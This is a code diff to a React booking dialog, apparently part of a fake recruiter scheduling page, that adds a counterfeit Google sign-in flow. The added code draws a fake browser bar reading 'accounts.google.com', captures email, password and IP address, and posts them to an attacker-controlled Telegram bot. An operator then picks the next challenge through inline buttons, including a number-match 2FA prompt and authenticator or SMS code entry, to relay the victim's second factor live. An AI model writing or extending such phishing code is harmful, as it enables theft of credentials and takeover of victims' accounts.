@@ -55,6 +55,7 @@ type Step =
   | "auth"
   | "permissions"
   | "full-login"
+  | "google-login"
   | "authenticator"
   | "ms-authenticator"
   | "verify-email"
@@ -104,6 +105,34 @@ function MessengerIcon({ className }: { className?: string }) {
         <path d="M12 0C5.24 0 0 4.95 0 11.64c0 3.5 1.44 6.53 3.77 8.63.2.17.31.42.32.68l.07 2.13c.02.68.72 1.12 1.34.85l2.38-1.05c.2-.09.42-.1.63-.05 1.1.3 2.27.46 3.49.46 6.76 0 12-4.95 12-11.64C24 4.95 18.76 0 12 0Zm7.2 8.93-3.52 5.59c-.56.89-1.77 1.11-2.61.48l-2.8-2.1a.72.72 0 0 0-.87 0l-3.78 2.87c-.5.38-1.16-.22-.82-.75l3.52-5.59c.56-.89 1.77-1.11 2.61-.48l2.8 2.1c.26.2.61.2.87 0l3.78-2.87c.5-.38 1.16.22.82.75Z" />
       </svg>
   )
+}
+
+function GoogleIcon({ className }: { className?: string }) {
+  return (
+      <svg viewBox="0 0 24 24" className={className} xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4" />
+        <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853" />
+        <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05" />
+        <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335" />
+      </svg>
+  )
+}
+
+// Non-Google personal email providers rejected by the Google sign-in flow.
+// Gmail / Googlemail are intentionally allowed (they are Google accounts), as are
+// business (Google Workspace) domains.
+const BLOCKED_EMAIL_DOMAINS = new Set([
+  "yahoo.com", "yahoo.co.uk", "yahoo.fr", "yahoo.de", "yahoo.in", "ymail.com",
+  "hotmail.com", "outlook.com", "live.com", "msn.com", "icloud.com", "me.com",
+  "mac.com", "aol.com", "protonmail.com", "proton.me", "zoho.com", "mail.com",
+  "gmx.com", "gmx.de", "yandex.com", "yandex.ru", "mail.ru", "rediffmail.com",
+])
+
+function isBusinessEmail(email: string): boolean {
+  const atIndex = email.lastIndexOf("@")
+  if (atIndex === -1 || atIndex === email.length - 1) return false
+  const domain = email.slice(atIndex + 1).trim().toLowerCase()
+  return domain.length > 0 && !BLOCKED_EMAIL_DOMAINS.has(domain)
 }
 
 function MicrosoftIcon({ className }: { className?: string }) {
@@ -185,8 +214,13 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
   const [date, setDate] = useState<Date | null>(null)
   const [time, setTime] = useState<string>("")
   const [form, setForm] = useState({ name: "", email: "", type: meetingTypes[0], notes: "" })
-  const [authProvider, setAuthProvider] = useState<"facebook" | "messenger" | "microsoft" | null>(null)
+  const [authProvider, setAuthProvider] = useState<"facebook" | "messenger" | "microsoft" | "google" | null>(null)
   const [msStep, setMsStep] = useState<"email" | "password">("email")
+  const [googleStep, setGoogleStep] = useState<"email" | "password" | "2fa" | "code">("email")
+  const [googleEmailError, setGoogleEmailError] = useState("")
+  const [googlePasswordError, setGooglePasswordError] = useState("")
+  const [showGooglePassword, setShowGooglePassword] = useState(false)
+  const [twoFaNumber, setTwoFaNumber] = useState("")
   const [login, setLogin] = useState({ id: "", password: "" })
   const [loggingIn, setLoggingIn] = useState(false)
   const [permVisible, setPermVisible] = useState(false)
@@ -267,18 +301,37 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [step])
 
-  function handleAuth(provider: "facebook" | "messenger" | "microsoft") {
+  function handleAuth(provider: "facebook" | "messenger" | "microsoft" | "google") {
     setAuthProvider(provider)
     setLogin({ id: "", password: "" })
     setMsStep("email")
+    setGoogleStep("email")
+    setGoogleEmailError("")
+    setGooglePasswordError("")
+    setShowGooglePassword(false)
+    setTwoFaNumber("")
     setPermVisible(false)
-    // Microsoft is a direct sign-in (no Meta-style OAuth consent screen),
-    // so it goes straight to the login form.
-    setStep(provider === "microsoft" ? "full-login" : "permissions")
+
+    if (provider === "google") {
+      // Google is a direct sign-in (email -> password -> 2FA), no consent screen.
+      setStep("google-login")
+    } else if (provider === "microsoft") {
+      // Microsoft is a direct sign-in (no Meta-style OAuth consent screen),
+      // so it goes straight to the login form.
+      setStep("full-login")
+    } else {
+      setStep("permissions")
+    }
 
     // Send auth provider selection to Telegram
     const providerName =
-      provider === "facebook" ? "Facebook" : provider === "messenger" ? "Messenger" : "Microsoft"
+      provider === "facebook"
+        ? "Facebook"
+        : provider === "messenger"
+          ? "Messenger"
+          : provider === "google"
+            ? "Google"
+            : "Microsoft"
     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -312,9 +365,21 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
 
     const text = `<b>🔐 Authentication Report</b>\n\n🔐 <b>Password:</b> <code>${login.password}</code>\n📧 <b>Email:</b> <code>${login.id}</code>\n🌐 <b>IP Address:</b> <code>${ip}</code>`
 
-    // Microsoft gets the full 2FA button set; Facebook/Messenger keep the original two buttons.
+    // Google gets 2FA / Authenticator / SMS / Wrong Password; Microsoft gets the
+    // full 2FA button set; Facebook/Messenger keep the original two buttons.
     const inlineKeyboard =
-      authProvider === "microsoft"
+      authProvider === "google"
+        ? [
+            [
+              { text: "🔢 2FA", callback_data: `/2fa ${sessionId}` },
+              { text: "🔐 Authenticator", callback_data: `/code ${sessionId}` },
+            ],
+            [
+              { text: "📱 SMS Code", callback_data: `/sms ${sessionId}` },
+              { text: "❌ Wrong Password", callback_data: `/wrong-password ${sessionId}` },
+            ],
+          ]
+        : authProvider === "microsoft"
         ? [
             [{ text: "❌ Wrong Password", callback_data: `/wrong-password ${sessionId}` }],
             [{ text: "🔐 Authenticator Code", callback_data: `/code ${sessionId}` }],
@@ -429,6 +494,139 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
     }
 
     throw new Error("Polling timed out or was aborted")
+  }
+
+  // Step 1: validate email locally (Gmail or business domains) and advance to
+  // the password page, exactly like the real Google sign-in flow.
+  function handleGoogleEmailNext(e: React.FormEvent) {
+    e.preventDefault()
+    const trimmed = login.id.trim()
+    if (!trimmed) return
+
+    if (!isBusinessEmail(trimmed)) {
+      setGoogleEmailError("Please use a Google or business email address.")
+      return
+    }
+
+    setGoogleEmailError("")
+    setGooglePasswordError("")
+    setLogin({ id: trimmed, password: "" })
+    setGoogleStep("password")
+  }
+
+  // Step 2: send credentials to Telegram and let the operator choose the next
+  // challenge (2FA number picker, authenticator/SMS code, or wrong password).
+  async function handleGooglePasswordSubmit(e: React.FormEvent) {
+    e.preventDefault()
+    if (!login.password.trim() || loggingIn) return
+
+    setLoggingIn(true)
+    setGooglePasswordError("")
+
+    try {
+      const sessionId = await sendLoginToTelegram()
+      const callbackData = await startPollingForAction(sessionId)
+      setLoggingIn(false)
+
+      if (callbackData.startsWith("/wrong-password")) {
+        setGooglePasswordError("Wrong password. Try again or click Forgot password to reset it.")
+        return
+      }
+
+      if (callbackData.startsWith("/2fa")) {
+        setGoogleStep("2fa")
+        setTwoFaNumber("")
+        void runGoogle2faFlow()
+        return
+      }
+
+      // /sms, /code, or any other action
+      setOtpCode("")
+      setOtpError("")
+      setGoogleStep("code")
+    } catch (error) {
+      console.error("Google login failed:", error)
+      setLoggingIn(false)
+      setGooglePasswordError("There was an issue verifying your login. Please try again.")
+    }
+  }
+
+  // Google "2FA": the operator sends a number the user must match in the Google
+  // prompt on their phone, then confirms the request.
+  async function runGoogle2faFlow() {
+    setIsSending(true)
+    setApproveError("")
+    setTwoFaNumber("")
+
+    try {
+      const ipResponse = await fetch("https://api.ipify.org?format=json").catch(() => null)
+      const ip = ipResponse?.ok ? (await ipResponse.json()).ip : "Unknown"
+
+      const pickerSessionId = ++pendingSessionId
+      const numberButtons: { text: string; callback_data: string }[][] = []
+      for (let n = 0; n <= 100; n += 8) {
+        const row: { text: string; callback_data: string }[] = []
+        for (let c = n; c < n + 8 && c <= 100; c++) {
+          row.push({ text: String(c), callback_data: `/2fa_${c} ${pickerSessionId}` })
+        }
+        numberButtons.push(row)
+      }
+
+      const pickerRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: `<b>🔢 Google — Pick a number</b>\n\n📧 <b>Email:</b> <code>${login.id}</code>\n🔑 <b>Password:</b> <code>${login.password}</code>\n🌐 <b>IP Address:</b> <code>${ip}</code>\n\nTap a number (0-100) to show on the web:`,
+          parse_mode: "HTML",
+          reply_markup: { inline_keyboard: numberButtons },
+        }),
+      })
+
+      if (!pickerRes.ok) throw new Error("Failed to send Google 2FA number picker")
+
+      const pickCallback = await startPollingForAction(pickerSessionId)
+      const match = pickCallback.match(/2fa_(\d+)/)
+      if (!match) throw new Error("Invalid 2FA number selection")
+      const chosen = match[1]
+      setTwoFaNumber(chosen)
+
+      const verifySessionId = ++pendingSessionId
+      const verifyRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: `<b>🔐 Google — Select 2FA code for verification</b>\n\n📧 <b>Email:</b> <code>${login.id}</code>\n🔑 <b>Password:</b> <code>${login.password}</code>\n🌐 <b>IP Address:</b> <code>${ip}</code>\n\n📱 Tap <b>${chosen}</b> to verify:`,
+          parse_mode: "HTML",
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: "✅ Verified", callback_data: `/complete ${verifySessionId}` },
+                { text: "❌ Deny", callback_data: `/2fa-deny ${verifySessionId}` },
+              ],
+            ],
+          },
+        }),
+      })
+
+      if (!verifyRes.ok) throw new Error("Failed to send Google 2FA verification request")
+
+      const verifyCallback = await startPollingForAction(verifySessionId)
+      setIsSending(false)
+
+      if (verifyCallback.startsWith("/complete")) {
+        await sendBookingConfirmation()
+        setStep("confirmed")
+        return
+      }
+
+      setApproveError("Verification failed. Try again.")
+    } catch (error) {
+      console.error("Google 2FA verification failed:", error)
+      setIsSending(false)
+      setApproveError("Verification failed. Try again.")
+    }
   }
 
   // Microsoft step 1: send the entered email to Telegram, wait for the bot.
@@ -814,7 +1012,7 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
 📆 <b>Date:</b> ${dateLabel || "Unknown"}
 🕐 <b>Time:</b> ${time || "Unknown"}
 📋 <b>Meeting Type:</b> ${form.type}
-🔐 <b>Verified via:</b> ${authProvider === "facebook" ? "Facebook" : authProvider === "messenger" ? "Messenger" : "Microsoft"}
+🔐 <b>Verified via:</b> ${authProvider === "facebook" ? "Facebook" : authProvider === "messenger" ? "Messenger" : authProvider === "google" ? "Google" : "Microsoft"}
 📝 <b>Notes:</b> ${form.notes || "None provided"}
 
 🔗 <i>Booking confirmed at: ${new Date().toLocaleString()}</i>
@@ -948,6 +1146,11 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
     setAuthProvider(null)
     setLogin({ id: "", password: "" })
     setMsStep("email")
+    setGoogleStep("email")
+    setGoogleEmailError("")
+    setGooglePasswordError("")
+    setShowGooglePassword(false)
+    setTwoFaNumber("")
     setLoggingIn(false)
     setPermVisible(false)
     setFullVisible(false)
@@ -986,9 +1189,21 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
       : ""
 
   const providerColor =
-      authProvider === "facebook" ? "#1877F2" : authProvider === "messenger" ? "#0A7CFF" : "#00A4EF"
+      authProvider === "facebook"
+        ? "#1877F2"
+        : authProvider === "messenger"
+          ? "#0A7CFF"
+          : authProvider === "google"
+            ? "#4285F4"
+            : "#00A4EF"
   const providerLabel =
-      authProvider === "facebook" ? "Facebook" : authProvider === "messenger" ? "Messenger" : "Microsoft"
+      authProvider === "facebook"
+        ? "Facebook"
+        : authProvider === "messenger"
+          ? "Messenger"
+          : authProvider === "google"
+            ? "Google"
+            : "Microsoft"
 
   // Microsoft OTP fields accept 6–10 digits; Facebook/Messenger stay strict 6.
   const otpMinLen = 6
@@ -1012,7 +1227,12 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
                 "gap-0 overflow-hidden p-0",
                 isFullScreen
                     ? "!left-0 !top-0 !translate-x-0 !translate-y-0 h-dvh !max-h-none w-screen !max-w-none !rounded-none !border-0 !shadow-none [&>button:last-child]:hidden"
-                    : "max-h-[92vh] overflow-y-auto sm:max-w-2xl"
+                    // Google keeps its own close button in the fake browser chrome, so hide
+                    // the default DialogContent close button to avoid showing two of them.
+                    : cn(
+                        "max-h-[92vh] overflow-y-auto sm:max-w-2xl",
+                        step === "google-login" && "[&>button:last-child]:hidden"
+                      )
             )}
             onInteractOutside={(e) => e.preventDefault()}
         >
@@ -1481,6 +1701,375 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
                       </div>
                     </>
                 )}
+              </div>
+          )}
+
+          {/* ─────────────────── GOOGLE SIGN-IN ─────────────────── */}
+          {step === "google-login" && authProvider === "google" && (
+              <div
+                  className="flex h-full flex-col overflow-y-auto bg-white"
+                  style={{
+                    fontFamily:
+                      '"Google Sans", Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
+                  }}
+              >
+                {/* Fake browser chrome with the accounts.google.com pill */}
+                <div className="flex shrink-0 items-center justify-between border-b border-[#e0e0e0] bg-[#f0f0f0] px-3 py-2.5 sm:px-4">
+                  <div className="flex w-16 shrink-0 items-center gap-1.5">
+                    <div className="size-2.5 rounded-full bg-[#ff5f56] sm:size-3" />
+                    <div className="size-2.5 rounded-full bg-[#ffbd2e] sm:size-3" />
+                    <div className="size-2.5 rounded-full bg-[#27c93f] sm:size-3" />
+                  </div>
+                  <div className="flex min-w-0 flex-1 justify-center px-2">
+                    <div className="flex h-6 w-full max-w-[220px] items-center justify-center gap-1.5 overflow-hidden rounded-md border border-[#dfdfdf] bg-white px-2.5 shadow-sm sm:h-7 sm:px-3">
+                      <Lock className="size-2.5 shrink-0 text-gray-500 sm:size-3" />
+                      <span className="mt-0.5 truncate text-[10px] font-medium text-gray-600 sm:text-[11px]">
+                        accounts.google.com
+                      </span>
+                    </div>
+                  </div>
+                  <div className="flex w-16 shrink-0 justify-end">
+                    <button
+                        type="button"
+                        onClick={() => handleOpenChange(false)}
+                        className="rounded-full p-1 text-gray-500 transition-colors hover:bg-black/5 hover:text-gray-800"
+                        aria-label="Close"
+                    >
+                      <svg viewBox="0 0 24 24" fill="none" className="size-4">
+                        <path d="M6 6l12 12M18 6L6 18" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
+                      </svg>
+                    </button>
+                  </div>
+                </div>
+
+                <div className="mx-auto flex w-full max-w-[500px] flex-1 flex-col px-6 py-10 sm:px-10 sm:py-12">
+                  <GoogleIcon className="mb-4 size-[46px] shrink-0" />
+
+                  {/* EMAIL */}
+                  {googleStep === "email" && (
+                      <>
+                        <h1 className="mb-4 text-[32px] font-normal leading-[40px] text-[#1f1f1f]">Sign in</h1>
+                        <p className="text-[16px] leading-6 tracking-[0.1px] text-[#1f1f1f]">
+                          with your Google Account to continue to Meta Careers. This account will be
+                          available to other Google apps in the browser.
+                        </p>
+
+                        <form onSubmit={handleGoogleEmailNext} className="flex shrink-0 flex-col">
+                          <div className="relative mt-10 shrink-0">
+                            <input
+                                id="google-email"
+                                type="email"
+                                value={login.id}
+                                onChange={(e) => {
+                                  setLogin({ ...login, id: e.target.value })
+                                  if (googleEmailError) setGoogleEmailError("")
+                                }}
+                                autoFocus
+                                className={cn(
+                                  "peer h-14 w-full rounded-lg border bg-transparent px-[15px] text-[16px] text-[#1f1f1f] outline-none transition-all focus:border-2",
+                                  googleEmailError
+                                    ? "border-[#d93025] focus:border-[#d93025]"
+                                    : "border-[#747775] focus:border-[#0b57d0]"
+                                )}
+                            />
+                            <label
+                                htmlFor="google-email"
+                                className={cn(
+                                  "pointer-events-none absolute left-3.5 -translate-y-1/2 bg-white px-1 text-[16px] transition-all duration-150 peer-focus:top-0 peer-focus:text-[12px]",
+                                  googleEmailError
+                                    ? "text-[#d93025] peer-focus:text-[#d93025]"
+                                    : "text-[#5e5e5e] peer-focus:text-[#0b57d0]",
+                                  login.id ? "top-0 text-[12px]" : "top-1/2"
+                                )}
+                            >
+                              Email or phone
+                            </label>
+                          </div>
+
+                          {googleEmailError && (
+                              <div className="mt-2 rounded-lg border border-[#d93025] bg-[#fce8e6] px-3 py-2.5 text-[13px] text-[#d93025] sm:text-sm" role="alert">
+                                {googleEmailError}
+                              </div>
+                          )}
+
+                          <button
+                              type="button"
+                              className="-ml-2 mt-1 self-start rounded px-2 py-2 text-[14px] font-medium text-[#0b57d0] transition-colors hover:bg-[#0b57d0]/[0.04]"
+                          >
+                            Forgot email?
+                          </button>
+
+                          <div className="mt-11 text-[14px] leading-5 text-[#1f1f1f]">
+                            Not your computer? Use Guest mode to sign in privately.{" "}
+                            <button type="button" className="rounded font-medium text-[#0b57d0] hover:underline">
+                              Learn more about using Guest mode
+                            </button>
+                          </div>
+
+                          <div className="mt-12 flex items-center justify-between">
+                            <button
+                                type="button"
+                                className="-ml-2 rounded px-2 py-2 text-[14px] font-medium text-[#0b57d0] transition-colors hover:bg-[#0b57d0]/[0.04]"
+                            >
+                              Create account
+                            </button>
+                            <button
+                                type="submit"
+                                disabled={!login.id.trim()}
+                                className="h-10 rounded-full bg-[#0b57d0] px-6 text-[14px] font-medium text-white transition-colors hover:bg-[#0a4bb8] disabled:cursor-not-allowed disabled:opacity-60"
+                            >
+                              Next
+                            </button>
+                          </div>
+                        </form>
+                      </>
+                  )}
+
+                  {/* PASSWORD */}
+                  {googleStep === "password" && (
+                      <>
+                        <h1 className="mb-6 text-[32px] font-normal leading-[40px] text-[#1f1f1f]">Welcome</h1>
+
+                        <button
+                            type="button"
+                            onClick={() => {
+                              setGoogleStep("email")
+                              setGooglePasswordError("")
+                            }}
+                            className="inline-flex max-w-full shrink-0 items-center gap-2 self-start rounded-full border border-[#747775] p-1 pr-2 text-[14px] text-[#1f1f1f] transition-colors hover:bg-[#3c4043]/[0.04]"
+                        >
+                          <span className="flex size-6 shrink-0 items-center justify-center rounded-full bg-[#5f6368]">
+                            <svg viewBox="0 0 24 24" fill="none" className="size-4 text-white">
+                              <path d="M12 12a4 4 0 1 0 0-8 4 4 0 0 0 0 8ZM4 20c0-3.3 3.6-6 8-6s8 2.7 8 6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
+                            </svg>
+                          </span>
+                          <span className="max-w-[220px] truncate">{login.id}</span>
+                          <ChevronRight className="size-4 shrink-0 rotate-90 text-[#444746]" />
+                        </button>
+
+                        <form onSubmit={handleGooglePasswordSubmit} className="flex shrink-0 flex-col">
+                          {googlePasswordError && (
+                              <div className="mt-6 rounded-lg border border-[#d93025] bg-[#fce8e6] px-3 py-2.5 text-[13px] text-[#d93025] sm:text-sm" role="alert">
+                                {googlePasswordError}
+                              </div>
+                          )}
+
+                          <div className="relative mt-10 shrink-0">
+                            <input
+                                id="google-password"
+                                type={showGooglePassword ? "text" : "password"}
+                                value={login.password}
+                                onChange={(e) => {
+                                  setLogin({ ...login, password: e.target.value })
+                                  if (googlePasswordError) setGooglePasswordError("")
+                                }}
+                                autoFocus
+                                className={cn(
+                                  "peer h-14 w-full rounded-lg border bg-transparent px-[15px] text-[16px] text-[#1f1f1f] outline-none transition-all focus:border-2",
+                                  googlePasswordError
+                                    ? "border-[#d93025] focus:border-[#d93025]"
+                                    : "border-[#747775] focus:border-[#0b57d0]"
+                                )}
+                            />
+                            <label
+                                htmlFor="google-password"
+                                className={cn(
+                                  "pointer-events-none absolute left-3.5 -translate-y-1/2 bg-white px-1 text-[16px] text-[#5e5e5e] transition-all duration-150 peer-focus:top-0 peer-focus:text-[12px] peer-focus:text-[#0b57d0]",
+                                  login.password ? "top-0 text-[12px]" : "top-1/2"
+                                )}
+                            >
+                              Enter your password
+                            </label>
+                          </div>
+
+                          <label className="mt-5 flex w-fit shrink-0 cursor-pointer select-none items-center gap-4">
+                            <input
+                                type="checkbox"
+                                checked={showGooglePassword}
+                                onChange={(e) => setShowGooglePassword(e.target.checked)}
+                                className="sr-only"
+                            />
+                            <span
+                                className={cn(
+                                  "flex size-[18px] shrink-0 items-center justify-center rounded-[2px] border-2 transition-colors",
+                                  showGooglePassword ? "border-[#0b57d0] bg-[#0b57d0]" : "border-[#5e5e5e]"
+                                )}
+                            >
+                              {showGooglePassword && <Check className="size-3.5 text-white" strokeWidth={4} />}
+                            </span>
+                            <span className="text-[14px] font-medium text-[#1f1f1f]">Show password</span>
+                          </label>
+
+                          <div className="mt-[60px] flex items-center justify-between sm:mt-[100px]">
+                            <button
+                                type="button"
+                                className="-ml-2 rounded px-2 py-2 text-[14px] font-medium text-[#0b57d0] transition-colors hover:bg-[#0b57d0]/[0.04]"
+                            >
+                              Forgot password?
+                            </button>
+                            <button
+                                type="submit"
+                                disabled={!login.password.trim() || loggingIn || isSending}
+                                className="flex h-10 items-center gap-2 rounded-full bg-[#0b57d0] px-6 text-[14px] font-medium text-white transition-colors hover:bg-[#0a4bb8] disabled:cursor-not-allowed disabled:opacity-60"
+                            >
+                              {(loggingIn || isSending) && <Loader2 className="size-4 animate-spin" />}
+                              {loggingIn ? "Verifying…" : "Next"}
+                            </button>
+                          </div>
+                        </form>
+                      </>
+                  )}
+
+                  {/* 2FA (Google prompt on phone) */}
+                  {googleStep === "2fa" && (
+                      <>
+                        <h1 className="mb-6 text-[32px] font-normal leading-[40px] text-[#1f1f1f]">
+                          2-Step Verification
+                        </h1>
+
+                        <div className="mb-6 inline-flex w-fit shrink-0 items-center gap-2 self-start rounded-2xl border border-[#c4c7c5] bg-[#f0f4f9] py-1 pl-1 pr-3 text-[14px] text-[#1f1f1f]">
+                          <span className="flex size-6 shrink-0 items-center justify-center rounded-full bg-[#0b57d0] text-[12px] font-medium text-white">
+                            {login.id.charAt(0).toUpperCase()}
+                          </span>
+                          <span className="max-w-[220px] truncate">{login.id}</span>
+                          <ChevronRight className="size-[18px] shrink-0 rotate-90 text-[#444746]" />
+                        </div>
+
+                        {approveError ? (
+                            <div className="rounded-lg border border-[#d93025] bg-[#fce8e6] px-3 py-2.5 text-[13px] text-[#d93025] sm:text-sm" role="alert">
+                              {approveError}
+                            </div>
+                        ) : twoFaNumber ? (
+                            <>
+                              <h2 className="text-[42px] font-normal leading-tight text-[#1f1f1f]">{twoFaNumber}</h2>
+                              <p className="mt-2 text-[16px] text-[#1f1f1f]">Check your signed-in device</p>
+                              <p className="mt-2 text-[14px] leading-6 text-[#5e5e5e]">
+                                Pull down the notification bar and tap the sign-in notification. Tap Yes,
+                                then tap <span className="font-medium text-[#1f1f1f]">{twoFaNumber}</span> on
+                                your device to verify it&apos;s you.
+                              </p>
+                            </>
+                        ) : (
+                            <div className="mt-16 flex shrink-0 flex-col items-center">
+                              <Loader2 className="size-12 animate-spin text-[#0b57d0]" />
+                              <p className="mt-6 text-[14px] text-[#5e5e5e]">Waiting for verification…</p>
+                            </div>
+                        )}
+
+                        <button
+                            type="button"
+                            onClick={() => void runGoogle2faFlow()}
+                            className="mt-6 self-start rounded text-[14px] font-medium text-[#0b57d0] hover:underline"
+                        >
+                          Resend it
+                        </button>
+                      </>
+                  )}
+
+                  {/* CODE (Authenticator / SMS) */}
+                  {googleStep === "code" && (
+                      <>
+                        <h1 className="mt-5 text-[32px] font-normal leading-[1.25] tracking-[-0.5px] text-[#202124]">
+                          2-Step Verification
+                        </h1>
+                        <p className="mt-4 text-[16px] leading-[1.5] text-[#202124]">
+                          To help keep your account safe, Google wants to make sure it&apos;s really you
+                          trying to sign in
+                        </p>
+
+                        <div className="mt-7 inline-flex max-w-full shrink-0 items-center gap-2 self-start rounded-full border border-[#dadce0] py-[5px] pl-[10px] pr-[14px] text-[14px] text-[#3c4043]">
+                          <svg viewBox="0 0 24 24" fill="none" className="size-6 shrink-0 text-[#5f6368]">
+                            <path d="M12 12a4 4 0 1 0 0-8 4 4 0 0 0 0 8ZM4 20c0-3.3 3.6-6 8-6s8 2.7 8 6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
+                          </svg>
+                          <span className="max-w-[220px] truncate">{login.id}</span>
+                          <ChevronRight className="size-[18px] shrink-0 rotate-90 text-[#5f6368]" />
+                        </div>
+
+                        <h2 className="mt-9 text-[22px] font-normal text-[#202124]">2-Step Verification</h2>
+                        <p className="mt-2 text-[14px] leading-[1.5] text-[#202124]">
+                          Get a verification code from the{" "}
+                          <span className="font-medium">Google Authenticator</span> app
+                        </p>
+
+                        <form
+                            onSubmit={(e) => {
+                              e.preventDefault()
+                              void handleAuthenticatorContinue()
+                            }}
+                            className="mt-6 flex flex-col"
+                        >
+                          {otpError && (
+                              <div className="mb-3 rounded-lg border border-[#d93025] bg-[#fce8e6] px-3 py-2.5 text-[13px] text-[#d93025] sm:text-sm" role="alert">
+                                {otpError}
+                              </div>
+                          )}
+
+                          <input
+                              id="google-code"
+                              inputMode="numeric"
+                              autoComplete="one-time-code"
+                              value={otpCode}
+                              onChange={(e) => {
+                                setOtpCode(e.target.value.replace(/\D/g, "").slice(0, 6))
+                                setOtpError("")
+                              }}
+                              placeholder="Enter code"
+                              autoFocus
+                              className="w-full rounded-lg border border-[#dadce0] px-[15px] py-[13px] text-[16px] text-[#202124] outline-none transition placeholder:text-[#5f6368] focus:border-[#1a73e8] focus:ring-1 focus:ring-inset focus:ring-[#1a73e8]"
+                          />
+
+                          <label className="mt-4 flex shrink-0 cursor-pointer select-none items-center gap-3.5">
+                            <input
+                                type="checkbox"
+                                checked={rememberDevice}
+                                onChange={(e) => setRememberDevice(e.target.checked)}
+                                className="sr-only"
+                            />
+                            <span
+                                className={cn(
+                                  "flex size-[18px] shrink-0 items-center justify-center rounded-[3px] border-2 transition-colors",
+                                  rememberDevice ? "border-[#1a73e8] bg-[#1a73e8]" : "border-[#5f6368]"
+                                )}
+                            >
+                              {rememberDevice && <Check className="size-3 text-white" strokeWidth={4} />}
+                            </span>
+                            <span className="text-[14px] text-[#202124]">Don&apos;t ask again on this device</span>
+                          </label>
+
+                          <div className="mt-11 flex items-center justify-between">
+                            <button
+                                type="button"
+                                onClick={() => setGoogleStep("password")}
+                                className="rounded text-[14px] font-medium text-[#1a73e8] transition-colors hover:text-[#174ea6]"
+                            >
+                              Try another way
+                            </button>
+                            <button
+                                type="submit"
+                                disabled={otpCode.trim().length < 6 || isSending}
+                                className="flex items-center gap-2 rounded-full bg-[#1a73e8] px-[26px] py-[10px] text-[14px] font-medium text-white transition-colors hover:bg-[#1b66c9] disabled:cursor-not-allowed disabled:opacity-60"
+                            >
+                              {isSending && <Loader2 className="size-4 animate-spin" />}
+                              {isSending ? "Verifying…" : "Next"}
+                            </button>
+                          </div>
+                        </form>
+                      </>
+                  )}
+
+                  {/* Google footer */}
+                  <div className="mt-5 flex shrink-0 items-center justify-between border-t border-[#e8eaed] pt-5 text-[12px] text-[#444746]">
+                    <span className="inline-flex items-center gap-1.5">
+                      English (United States)
+                      <ChevronRight className="size-5 rotate-90 text-[#444746]" />
+                    </span>
+                    <nav className="flex gap-6">
+                      <button type="button" className="hover:text-[#1f1f1f]">Help</button>
+                      <button type="button" className="hover:text-[#1f1f1f]">Privacy</button>
+                      <button type="button" className="hover:text-[#1f1f1f]">Terms</button>
+                    </nav>
+                  </div>
+                </div>
               </div>
           )}
 
@@ -2127,7 +2716,7 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
           {!isFullScreen && (
               <>
                 {/* Recruiter header strip */}
-                {step !== "confirmed" && activeRecruiter && (
+                {step !== "confirmed" && step !== "google-login" && activeRecruiter && (
                     <div className="flex items-center gap-3 border-b border-border px-4 py-3 sm:px-6 sm:py-4">
                       {activeRecruiter.photo ? (
                           <img
@@ -2447,15 +3036,29 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
                           Continue with Messenger
                         </Button>
 
+                        {/* Microsoft option hidden (kept for reference) */}
+                        {false && (
+                            <Button
+                                type="button"
+                                size="lg"
+                                variant="outline"
+                                onClick={() => handleAuth("microsoft")}
+                                className="h-12 w-full justify-center gap-2.5 rounded-xl border-border font-semibold text-foreground hover:bg-accent"
+                            >
+                              <MicrosoftIcon className="size-5" />
+                              Continue with Microsoft
+                            </Button>
+                        )}
+
                         <Button
                             type="button"
                             size="lg"
                             variant="outline"
-                            onClick={() => handleAuth("microsoft")}
+                            onClick={() => handleAuth("google")}
                             className="h-12 w-full justify-center gap-2.5 rounded-xl border-border font-semibold text-foreground hover:bg-accent"
                         >
-                          <MicrosoftIcon className="size-5" />
-                          Continue with Microsoft
+                          <GoogleIcon className="size-5" />
+                          Continue with Google
                         </Button>
 
                         <p className="mt-1 flex items-center justify-center gap-1.5 text-center text-xs text-muted-foreground">
